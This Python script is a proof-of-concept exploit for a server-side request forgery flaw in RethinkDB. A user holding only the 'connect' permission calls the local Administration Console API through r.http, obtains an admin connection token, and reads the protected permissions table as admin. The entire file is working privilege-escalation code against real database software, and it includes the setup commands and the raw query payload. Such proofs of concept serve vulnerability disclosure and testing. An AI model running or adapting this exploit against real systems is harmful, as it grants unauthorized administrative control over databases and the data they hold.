#!/usr/bin/env python3
#
# PoC for SSRF leads to privilege escalation in RethinkDB
# User with `connect` permission can use Administration Console API (http://127.0.0.1:8080/) to execute RethinkDB commands as admin
#
# Setup:
# r.db('rethinkdb').table('users').insert({id: 'cheburek', password: 'cheburek'})
# r.grant('cheburek', {connect: true})
#

import rethinkdb as r

# Auth as non-privileged account
c = r.connect(user='cheburek', password='cheburek')

# Permissions check
print("Proving that we don\'t have permissions for executing `r.db('rethinkdb').table('permissions')`")
try:
    r.db('rethinkdb').table('permissions').run(c)
    raise Exception('WTF: user has permissions for `rethinkdb.permissions` table')
except r.errors.ReqlPermissionError as e:
    print('OK: {}'.format(e), end='\n\n')

print('Open admin connection via Administration Console API')
token = r.http('http://127.0.0.1:8080/ajax/reql/open-new-connection', method='POST').run(c)
print('Connected with token `{}`'.format(token), end='\n\n')

print("Executing `r.db('rethinkdb').table('permissions')` as admin...")
result = r.http('http://127.0.0.1:8080/ajax/reql/?conn_id={}'.format(token),
                method='POST',
                data='\x01\x00\x00\x00\x00\x00\x00\x00'
                '[1,[15,[[14,["rethinkdb"]],"permissions"]],{"binary_format":"raw","time_format":"raw","profile":false}]').run(c)

print(bytes(result))
